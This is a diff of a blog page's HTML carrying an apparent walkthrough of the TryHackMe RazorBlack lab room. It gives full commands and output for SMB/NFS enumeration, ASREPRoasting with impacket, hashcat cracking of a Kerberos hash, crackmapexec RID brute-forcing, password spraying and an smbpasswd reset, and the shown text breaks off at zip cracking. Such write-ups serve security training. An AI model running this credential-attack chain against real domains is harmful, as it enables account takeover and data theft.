@@ -1,13 +1,132 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><title>TryHackMe RazorBlack | Classroom</title><link href=/img/avatar.jpeg rel="shortcut icon" type=image/x-icon><meta name=author content="Animesh Roy"><meta name=description content="TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. These guys call themselves hackers. Can you show them who's the boss ??"><script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-NZBEX7RBNF"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-NZBEX7RBNF')</script><script type=text/javascript>(function(a,e,b,f,g,c,d){a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},c=e.createElement(f),c.async=1,c.src="https://www.clarity.ms/tag/"+g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d)})(window,document,"clarity","script","6gp5990ghr")</script><link rel=canonical href=https://classroom.anir0y.in/post/tryhackme-raz0rblack/><meta property="og:title" content="TryHackMe RazorBlack"><meta property="og:description" content="TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. These guys call themselves hackers. Can you show them who's the boss ??"><meta property="og:type" content="article"><meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-raz0rblack/"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-07-18T19:31:05+05:30"><meta property="article:modified_time" content="2021-07-18T19:31:05+05:30"><meta name=twitter:card content="summary"><meta name=twitter:title content="TryHackMe RazorBlack"><meta name=twitter:description content="TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. These guys call themselves hackers. Can you show them who's the boss ??"><link rel=stylesheet href=/css/semantic.min.css><link rel=stylesheet href=/css/icomoon.css><link rel=stylesheet href=/css/OverlayScrollbars.min.css><link rel=stylesheet href=/css/github-markdown.css><link rel=stylesheet href=/css/site.css><link rel=stylesheet href=/css/custom.css><style>a:not(.ui.button):hover{text-decoration:underline}a:not(.ui.button){color:#2e8b57!important}.inverted a:not(.ui.button),.inverted a:not(.ui.button):hover{color:#8fbc8f!important}body.default{background-color:#fff}body.dark{background-color:#000}</style><link rel=stylesheet data-highlight href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css><link rel=stylesheet href=/css/custom.css></head><body class=default><nav class="ui secondary menu dream-menu"><div class=item><i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i></div><div class=item><i class="large link home icon" title=Home onclick="window.location.href='https://classroom.anir0y.in'"></i></div><div class=item><i class="large link icon theme-switch" onclick=themeSwitch()></i></div><div class=item><i class="large link search icon" onclick=toggleSearch()></i></div></nav><div class=flip-container><div class=flipper><section class=front><div class=dream-max-width><div class="ui relaxed grid dream-grid dream-grid-single" style=flex-direction:row-reverse><aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside"><div class="ui segment toc"><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#task-01>Task 01</a></li><li><a href=#task-02-flag-submission-panel>Task 02: Flag Submission Panel</a></li><li><a href=#what-is-the-domain-name>What is the Domain Name?</a></li><li><a href=#what-is-stevens-flag>What is Steven’s Flag?</a></li><li><a href=#what-is-the-zip-files-password>What is the zip file’s password?</a><ul><li><a href=#asreproast>ASREPRoast</a></li></ul></li><li><a href=#what-is-ljudmilas-hash>What is Ljudmila’s Hash?</a></li><li><a href=#what-is-ljudmilas-flag>What is Ljudmila’s Flag?</a></li><li><a href=#what-is-xyan1d3s-password>What is Xyan1d3’s password?</a></li><li><a href=#what-is-xyan1d3s-flag>What is Xyan1d3’s Flag?</a></li><li><a href=#what-is-the-root-flag>What is the root Flag?</a></li><li><a href=#what-is-tysons-flag>What is Tyson’s Flag?</a></li><li><a href=#what-is-the-complete-top-secret>What is the complete top secret?</a></li></ul></nav></div><div class="ui segment actions"><button class="ui circular icon button save-as-image" title="Save as image" onclick=savePostAsImg()>
-<i class="save icon"></i></button>
-<a href="https://twitter.com/intent/tweet?text=TryHackMe%20RazorBlack&url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-raz0rblack%2f" class="ui circular twitter icon button"><i class="twitter icon"></i></a>
-<a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-raz0rblack%2f" class="ui circular facebook icon button"><i class="facebook icon"></i></a></div></aside><div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id=dream-save-post-as-img><section class="ui top attached segment"><header><h1 class="ui large header">TryHackMe RazorBlack<div class="sub header">@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<title>TryHackMe RazorBlack | Classroom</title>
+<link href=/img/avatar.jpeg rel="shortcut icon" type=image/x-icon>
+<meta name=author content="Animesh Roy">
+<meta name=description content="TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. These guys call themselves hackers. Can you show them who's the boss ??">
+<script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
+<script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NZBEX7RBNF"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-NZBEX7RBNF')</script>
+<script type=text/javascript>(function(a,e,b,f,g,c,d){a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},c=e.createElement(f),c.async=1,c.src="https://www.clarity.ms/tag/"+g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d)})(window,document,"clarity","script","6gp5990ghr")</script>
+<link rel=canonical href=https://classroom.anir0y.in/post/tryhackme-raz0rblack/>
+<meta property="og:title" content="TryHackMe RazorBlack">
+<meta property="og:description" content="TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. These guys call themselves hackers. Can you show them who's the boss ??">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-raz0rblack/"><meta property="article:section" content="post">
+<meta property="article:published_time" content="2021-07-18T19:31:05+05:30">
+<meta property="article:modified_time" content="2021-07-18T19:31:05+05:30">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="TryHackMe RazorBlack">
+<meta name=twitter:description content="TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. These guys call themselves hackers. Can you show them who's the boss ??">
+<link rel=stylesheet href=/css/semantic.min.css>
+<link rel=stylesheet href=/css/icomoon.css>
+<link rel=stylesheet href=/css/OverlayScrollbars.min.css>
+<link rel=stylesheet href=/css/github-markdown.css>
+<link rel=stylesheet href=/css/site.css>
+<link rel=stylesheet href=/css/custom.css>
+<style>a:not(.ui.button):hover{text-decoration:underline}a:not(.ui.button){color:#2e8b57!important}.inverted a:not(.ui.button),.inverted a:not(.ui.button):hover{color:#8fbc8f!important}body.default{background-color:#fff}body.dark{background-color:#000}</style>
+<link rel=stylesheet data-highlight href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css>
+<link rel=stylesheet href=/css/custom.css>
+</head>
+<body class=default>
+<nav class="ui secondary menu dream-menu">
+<div class=item>
+<i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
+</div>
+<div class=item>
+<i class="large link home icon" title=Home onclick="window.location.href='https://classroom.anir0y.in'"></i>
+</div>
+<div class=item>
+<i class="large link icon theme-switch" onclick=themeSwitch()></i>
+</div>
+<div class=item>
+<i class="large link search icon" onclick=toggleSearch()></i>
+</div>
+</nav>
+<div class=flip-container>
+<div class=flipper>
+<section class=front>
+<div class=dream-max-width>
+<div class="ui relaxed grid dream-grid dream-grid-single" style=flex-direction:row-reverse>
+<aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside">
+<div class="ui segment toc">
+<nav id=TableOfContents>
+<ul>
+<li><a href=#overview>Overview</a></li>
+<li><a href=#task-01>Task 01</a></li>
+<li><a href=#task-02-flag-submission-panel>Task 02: Flag Submission Panel</a></li>
+<li><a href=#what-is-the-domain-name>What is the Domain Name?</a></li>
+<li><a href=#what-is-stevens-flag>What is Steven’s Flag?</a></li>
+<li><a href=#what-is-the-zip-files-password>What is the zip file’s password?</a>
+<ul>
+<li><a href=#asreproast>ASREPRoast</a></li>
+</ul>
+</li>
+<li><a href=#what-is-ljudmilas-hash>What is Ljudmila’s Hash?</a></li>
+<li><a href=#what-is-ljudmilas-flag>What is Ljudmila’s Flag?</a></li>
+<li><a href=#what-is-xyan1d3s-password>What is Xyan1d3’s password?</a></li>
+<li><a href=#what-is-xyan1d3s-flag>What is Xyan1d3’s Flag?</a></li>
+<li><a href=#what-is-the-root-flag>What is the root Flag?</a></li>
+<li><a href=#what-is-tysons-flag>What is Tyson’s Flag?</a></li>
+<li><a href=#what-is-the-complete-top-secret>What is the complete top secret?</a></li>
+</ul>
+</nav>
+</div>
+<div class="ui segment actions">
+<button class="ui circular icon button save-as-image" title="Save as image" onclick=savePostAsImg()>
+<i class="save icon"></i>
+</button>
+<a href="https://twitter.com/intent/tweet?text=TryHackMe%20RazorBlack&url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-raz0rblack%2f" class="ui circular twitter icon button">
+<i class="twitter icon"></i>
+</a>
+<a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-raz0rblack%2f" class="ui circular facebook icon button">
+<i class="facebook icon"></i>
+</a>
+</div>
+</aside>
+<div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id=dream-save-post-as-img>
+<section class="ui top attached segment">
+<header>
+<h1 class="ui large header">TryHackMe RazorBlack<div class="sub header">
+@
 <a href=https://bit.ly/34sGFiK target=_blank>Animesh Roy</a>
 |
 Sunday, Jul 18, 2021
 | 11 minutes read
 | Update at
-Sunday, Jul 18, 2021</div></h1></header><article class=main><h2 id=overview>Overview</h2><table><thead><tr><th>RazorBlack</th><th></th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/raz0rblack>Room</a></td><td><img src=https://tryhackme-images.s3.amazonaws.com/room-icons/5e543ba613749349efa339fbf3aca901.jpeg alt=logo></td></tr></tbody></table><hr><h2 id=task-01>Task 01</h2><p>These guys call themselves hackers. Can you show them who&rsquo;s the boss ??</p><hr><h2 id=task-02-flag-submission-panel>Task 02: Flag Submission Panel</h2><h2 id=what-is-the-domain-name>What is the Domain Name?</h2><ul><li><p>nmap</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo nmap -sV -sC -oN nmap/init 10.10.149.120
+Sunday, Jul 18, 2021
+</div>
+</h1>
+</header>
+<article class=main><h2 id=overview>Overview</h2>
+<table>
+<thead>
+<tr>
+<th>RazorBlack</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href=https://tryhackme.com/room/raz0rblack>Room</a></td>
+<td><img src=https://tryhackme-images.s3.amazonaws.com/room-icons/5e543ba613749349efa339fbf3aca901.jpeg alt=logo></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id=task-01>Task 01</h2>
+<p>These guys call themselves hackers. Can you show them who&rsquo;s the boss ??</p>
+<hr>
+<h2 id=task-02-flag-submission-panel>Task 02: Flag Submission Panel</h2>
+<h2 id=what-is-the-domain-name>What is the Domain Name?</h2>
+<ul>
+<li>
+<p>nmap</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo nmap -sV -sC -oN nmap/init 10.10.149.120
 <span style=color:#75715e># Nmap 7.91 scan initiated Sun Jul 18 19:35:34 2021 as: nmap -sV -sC -oN nmap/init 10.10.149.120</span>
 Nmap scan report <span style=color:#66d9ef>for</span> 10.10.149.120
 Host is up <span style=color:#f92672>(</span>0.15s latency<span style=color:#f92672>)</span>.
@@ -55,14 +174,28 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 <span style=color:#75715e># Nmap done at Sun Jul 18 19:38:17 2021 -- 1 IP address (1 host up) scanned in 163.34 seconds</span>
 
-</code></pre></div></li></ul><hr><h2 id=what-is-stevens-flag>What is Steven’s Flag?</h2><ul><li><p>SMB</p><p><strong>SMBMAP</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>anir0y㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/share/thm/room/raz0rblack<span style=color:#f92672>]</span>
+</code></pre></div></li>
+</ul>
+<hr>
+<h2 id=what-is-stevens-flag>What is Steven’s Flag?</h2>
+<ul>
+<li>
+<p>SMB</p>
+<p><strong>SMBMAP</strong></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>anir0y㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/share/thm/room/raz0rblack<span style=color:#f92672>]</span>
 └─$ smbmap -u <span style=color:#e6db74>&#39;&#39;</span> -p <span style=color:#e6db74>&#39;&#39;</span> -H 10.10.149.120                                        <span style=color:#ae81ff>2</span> ⨯
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> IP: 10.10.149.120:445       Name: 10.10.149.120 
-</code></pre></div></li><li><p>showmount</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>anir0y㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/share/thm/room/raz0rblack<span style=color:#f92672>]</span>
+</code></pre></div></li>
+<li>
+<p>showmount</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>anir0y㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/share/thm/room/raz0rblack<span style=color:#f92672>]</span>
 └─$ showmount -e 10.10.149.120      
 Export list <span style=color:#66d9ef>for</span> 10.10.149.120:
 /users <span style=color:#f92672>(</span>everyone<span style=color:#f92672>)</span>
-</code></pre></div></li><li><p>showmount shows us one dir, let&rsquo;s mount it to local machine and continue:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zsh data-lang=zsh><span style=color:#75715e># create a mount dir</span>
+</code></pre></div></li>
+<li>
+<p>showmount shows us one dir, let&rsquo;s mount it to local machine and continue:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zsh data-lang=zsh><span style=color:#75715e># create a mount dir</span>
 $ mkdir smb
 $ sudo mount -t nfs -o vers<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> 10.10.149.120:/users ./smb
 $ sudo -i 
@@ -73,8 +206,14 @@ total <span style=color:#ae81ff>2</span>
 -rwx------ <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>4294967294</span> <span style=color:#ae81ff>4294967294</span>   <span style=color:#ae81ff>80</span> Feb <span style=color:#ae81ff>26</span> 01:01 sbradley.txt
 <span style=color:#75715e># cat sbradley.txt</span>
 THM<span style=color:#f92672>{</span>flag-data<span style=color:#f92672>}</span>
-</code></pre></div></li><li><p>there is another file <code>employee_status.xlsx</code> let&rsquo;s read the content of this file. in my case I used MS office, you can use any office application.
-<strong>Extracted usernames from the xlsx file:</strong></p></li><li><p>content</p><pre><code class=language-notepad data-lang=notepad>daven port
+</code></pre></div></li>
+<li>
+<p>there is another file <code>employee_status.xlsx</code> let&rsquo;s read the content of this file. in my case I used MS office, you can use any office application.
+<strong>Extracted usernames from the xlsx file:</strong></p>
+</li>
+<li>
+<p>content</p>
+<pre><code class=language-notepad data-lang=notepad>daven port
 imogen royce
 tamara vidal
 arthur edwards
@@ -86,8 +225,11 @@ rico delgado
 tyson williams
 steven bradley
 chamber lin
-</code></pre></li><li><p>create a users file based on <code>employee list</code>
-I tried with hashcat to create userlist, but turns out format is First letter of <code>First Name + Last name: i.e. dport for daven port</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$cat user.lst
+</code></pre></li>
+<li>
+<p>create a users file based on <code>employee list</code>
+I tried with hashcat to create userlist, but turns out format is First letter of <code>First Name + Last name: i.e. dport for daven port</code></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$cat user.lst
 dport
 iroyce
 tvidal
@@ -100,9 +242,24 @@ rdelgado
 twilliams
 sbradley
 clin
-</code></pre></div></li><li><p>DNS, let&rsquo;s map the domain to IP</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cat /etc/hosts
+</code></pre></div></li>
+<li>
+<p>DNS, let&rsquo;s map the domain to IP</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cat /etc/hosts
 10.10.149.120   raz0rblack raz0rblack.thm
-</code></pre></div></li></ul><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><hr><h2 id=what-is-the-zip-files-password>What is the zip file’s password?</h2><h3 id=asreproast>ASREPRoast</h3><ul><li><p>let&rsquo;s go</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ python3 /opt/impacket/examples/GetNPUsers.py <span style=color:#e6db74>&#39;raz0rblack.thm/&#39;</span> -usersfile user.lst -no-pass -dc-ip MACHINE_IP -format hashcat -outputfile hashes.asreproast
+</code></pre></div></li>
+</ul>
+<hr>
+<script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
+<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
+<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
+<hr>
+<h2 id=what-is-the-zip-files-password>What is the zip file’s password?</h2>
+<h3 id=asreproast>ASREPRoast</h3>
+<ul>
+<li>
+<p>let&rsquo;s go</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ python3 /opt/impacket/examples/GetNPUsers.py <span style=color:#e6db74>&#39;raz0rblack.thm/&#39;</span> -usersfile user.lst -no-pass -dc-ip MACHINE_IP -format hashcat -outputfile hashes.asreproast
 
 Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright <span style=color:#ae81ff>2021</span> SecureAuth Corporation
 
@@ -130,7 +287,10 @@ $ hashcat -m <span style=color:#ae81ff>18200</span> hashes.asreproast rockyou.tx
 hashcat -m <span style=color:#ae81ff>18200</span> hashes.asreproast --show                          
 $krb5asrep$23$twilliams@RAZ0RBLACK.THM:c9a4cd51d976e6b0138462b5f79eaf7b$f932933d4290a95cf38f93c6f87004c025b2a956493479e878e9731b52a7ad63cf89d63113f49c5d97a957448085e403d10c02ca99cf935d9079c293dc26deced316d568d01f221b6c008480011a79c58fb2b89679c765cfdf3e9e73aebe6a61c698ac1e74bc3adb6b8bfa286f72818ddaa8a8b4410643c4088b880ba9543bdbaf4974cde2249be746016f2b0b04c24a46fd85c9536d5f30a57a38f4a8a13a4b4ea554d61d80bd6f93c1cec68ffa263f9e1450e2b3cca940eba1c755518c9411406bd503df48cac7f19f613fe6dfbd3f8ab4e33be309cac8b9edfe5ad961acc0246fd2f98f4fc5f0c15d05c7aa07743c:roastpotatoes
 
-</code></pre></div></li><li><p>trying loggin in with new creds (SMB)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ smbmap -H MACHINE_IP -u twilliams -p roastpotatoes
+</code></pre></div></li>
+<li>
+<p>trying loggin in with new creds (SMB)</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ smbmap -H MACHINE_IP -u twilliams -p roastpotatoes
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> IP: MACHINE_IP:445        Name: MACHINE_IP
    Disk                                                    Permissions     Comment
    ----                                                    -----------     -------
@@ -140,7 +300,10 @@ $krb5asrep$23$twilliams@RAZ0RBLACK.THM:c9a4cd51d976e6b0138462b5f79eaf7b$f932933d
    NETLOGON                                                READ ONLY       Logon server share
    SYSVOL                                                  READ ONLY       Logon server share
    trash                                                   NO ACCESS       Files Pending <span style=color:#66d9ef>for</span> deletion
-</code></pre></div></li><li><p>we can read IPC$, that means we can bruteforce ussernames:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ crackmapexec smb <span style=color:#66d9ef>$(</span>cat hosts<span style=color:#66d9ef>)</span> -u <span style=color:#e6db74>&#39;twilliams&#39;</span> -p <span style=color:#e6db74>&#39;roastpotatoes&#39;</span> --rid-brute
+</code></pre></div></li>
+<li>
+<p>we can read IPC$, that means we can bruteforce ussernames:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ crackmapexec smb <span style=color:#66d9ef>$(</span>cat hosts<span style=color:#66d9ef>)</span> -u <span style=color:#e6db74>&#39;twilliams&#39;</span> -p <span style=color:#e6db74>&#39;roastpotatoes&#39;</span> --rid-brute
 <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> First time use detected
 <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating home directory structure
 <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating default workspace
@@ -182,23 +345,38 @@ SMB         10.10.149.120   <span style=color:#ae81ff>445</span>    HAVEN-DC    
 SMB         10.10.149.120   <span style=color:#ae81ff>445</span>    HAVEN-DC         1107: RAZ0RBLACK<span style=color:#ae81ff>\l</span>vetrova <span style=color:#f92672>(</span>SidTypeUser<span style=color:#f92672>)</span>
 SMB         10.10.149.120   <span style=color:#ae81ff>445</span>    HAVEN-DC         1108: RAZ0RBLACK<span style=color:#ae81ff>\s</span>bradley <span style=color:#f92672>(</span>SidTypeUser<span style=color:#f92672>)</span>
 SMB         10.10.149.120   <span style=color:#ae81ff>445</span>    HAVEN-DC         1109: RAZ0RBLACK<span style=color:#ae81ff>\t</span>williams <span style=color:#f92672>(</span>SidTypeUser<span style=color:#f92672>)</span>
-</code></pre></div></li><li><p>new users add them to a file</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>xyan1d3
+</code></pre></div></li>
+<li>
+<p>new users add them to a file</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>xyan1d3
 lvetrova
 sbradley
 twilliams
-</code></pre></div></li><li><p>Password:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>roastpotatoes
-</code></pre></div></li><li><p>checking for password reuse:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ crackmapexec smb <span style=color:#66d9ef>$(</span>cat hosts<span style=color:#66d9ef>)</span> -u user.lst  -p pass.lst                                             <span style=color:#ae81ff>130</span> ⨯
+</code></pre></div></li>
+<li>
+<p>Password:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>roastpotatoes
+</code></pre></div></li>
+<li>
+<p>checking for password reuse:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ crackmapexec smb <span style=color:#66d9ef>$(</span>cat hosts<span style=color:#66d9ef>)</span> -u user.lst  -p pass.lst                                             <span style=color:#ae81ff>130</span> ⨯
 
 SMB         10.10.149.120   <span style=color:#ae81ff>445</span>    HAVEN-DC         <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Windows 10.0 Build <span style=color:#ae81ff>17763</span> x64 <span style=color:#f92672>(</span>name:HAVEN-DC<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>domain:raz0rblack.thm<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>signing:True<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>SMBv1:False<span style=color:#f92672>)</span>
 SMB         10.10.149.120   <span style=color:#ae81ff>445</span>    HAVEN-DC         <span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> raz0rblack.thm<span style=color:#ae81ff>\x</span>yan1d3:roastpotatoes STATUS_LOGON_FAILURE 
 SMB         10.10.149.120   <span style=color:#ae81ff>445</span>    HAVEN-DC         <span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> raz0rblack.thm<span style=color:#ae81ff>\l</span>vetrova:roastpotatoes STATUS_LOGON_FAILURE 
 SMB         10.10.149.120   <span style=color:#ae81ff>445</span>    HAVEN-DC         <span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> raz0rblack.thm<span style=color:#ae81ff>\s</span>bradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
-</code></pre></div></li><li><p>let&rsquo;s change the password for <code>sbradley</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ smbpasswd -r <span style=color:#66d9ef>$(</span>cat hosts<span style=color:#66d9ef>)</span> -U sbradley                                                                    <span style=color:#ae81ff>1</span> ⨯
+</code></pre></div></li>
+<li>
+<p>let&rsquo;s change the password for <code>sbradley</code></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ smbpasswd -r <span style=color:#66d9ef>$(</span>cat hosts<span style=color:#66d9ef>)</span> -U sbradley                                                                    <span style=color:#ae81ff>1</span> ⨯
 Old SMB password: <span style=color:#e6db74>`</span>roastpotatoes<span style=color:#e6db74>`</span>
 New SMB password: <span style=color:#e6db74>`</span>Passw0rd!<span style=color:#e6db74>`</span>
 Retype new SMB password: <span style=color:#e6db74>`</span>Passw0rd!<span style=color:#e6db74>`</span>
 Password changed <span style=color:#66d9ef>for</span> user sbradley <span style=color:#75715e>#password is set to our password</span>
-</code></pre></div></li><li><p>Enumerate SMB with new password:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>smbmap -H MACHINE_IP -u sbradley -p <span style=color:#e6db74>&#39;Passw0rd!&#39;</span>
+</code></pre></div></li>
+<li>
+<p>Enumerate SMB with new password:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>smbmap -H MACHINE_IP -u sbradley -p <span style=color:#e6db74>&#39;Passw0rd!&#39;</span>
 <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> IP: MACHINE_IP:445        Name: MACHINE_IP
      Disk                                                    Permissions     Comment
      ----                                                    -----------     -------
@@ -222,7 +400,10 @@ smb: <span style=color:#ae81ff>\&gt;</span> recurse on
 smb: <span style=color:#ae81ff>\&gt;</span> prompt off
 smb: <span style=color:#ae81ff>\&gt;</span> mget *
 <span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
-</code></pre></div></li><li><p>Cracking the zip and looking at contents:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># convert to hash that john can crack</span>
+</code></pre></div></li>
+<li>
+<p>Cracking the zip and looking at contents:</p>
